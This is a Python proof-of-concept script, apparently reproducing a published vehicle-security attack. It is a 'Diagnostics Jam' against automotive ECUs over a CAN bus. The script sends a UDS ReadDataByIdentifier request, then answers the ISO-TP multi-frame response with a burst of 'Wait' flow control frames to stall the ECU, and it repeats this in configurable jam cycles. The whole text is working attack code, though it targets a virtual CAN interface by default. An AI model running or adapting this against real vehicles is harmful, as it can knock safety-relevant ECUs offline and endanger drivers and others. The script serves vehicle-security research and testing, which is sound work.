#!/usr/bin/env python3
"""Diagnostics Jam (V-C, VehicleSec 2024) PoC.
Sends an RDBI request, then instead of a normal ISO-TP Flow Control
handshake, injects a burst of 'Wait' FC frames to stall the ECU's
response transmission and observe whether it becomes unresponsive."""
import socket
import struct
import time
import sys

IFACE = "vcan0"
REQ_ID = 0x7E0
RESP_ID = 0x7E8
DID = 0xF190
CAN_FMT = "=IB3x8s"

def build_frame(can_id, payload):
    payload = payload.ljust(8, b"\x00")
    return struct.pack(CAN_FMT, can_id, 8, payload)

def parse_frame(frame):
    can_id, dlc, data = struct.unpack(CAN_FMT, frame)
    return can_id & socket.CAN_SFF_MASK, data[:dlc]

def run_once(s):
    req = bytes([0x03, 0x22, (DID >> 8) & 0xFF, DID & 0xFF])
    s.send(build_frame(REQ_ID, req))
    print(f"[attack] sent RDBI request for {DID:#06x}")

    ff = None
    deadline = time.time() + 2
    while time.time() < deadline:
        can_id, data = parse_frame(s.recv(16))
        if can_id == RESP_ID and (data[0] >> 4) == 0x1:
            ff = data
            break
    if ff is None:
        print("[attack] no First Frame received - not multi-frame, aborting")
        return False

    total_len = ((ff[0] & 0x0F) << 8) | ff[1]
    print(f"[attack] First Frame received, total length={total_len}")

    s.send(build_frame(REQ_ID, bytes([0x30, 0x01, 0x00])))
    print("[attack] sent FC (CTS, block size=1)")
    time.sleep(0.05)

    for i in range(10):
        s.send(build_frame(REQ_ID, bytes([0x31, 0x00, 0x00])))
        print(f"[attack] sent FC (Wait) #{i + 1}")
        time.sleep(0.1)

    s.send(build_frame(REQ_ID, bytes([0x30, 0x00, 0x00])))
    print("[attack] sent final FC (CTS) - releasing ECU")
    return True

def main():
    s = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
    s.bind((IFACE,))
    loops = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    for i in range(loops):
        print(f"--- jam cycle {i + 1}/{loops} ---")
        if not run_once(s):
            break
        time.sleep(0.5)

if __name__ == "__main__":
    main()
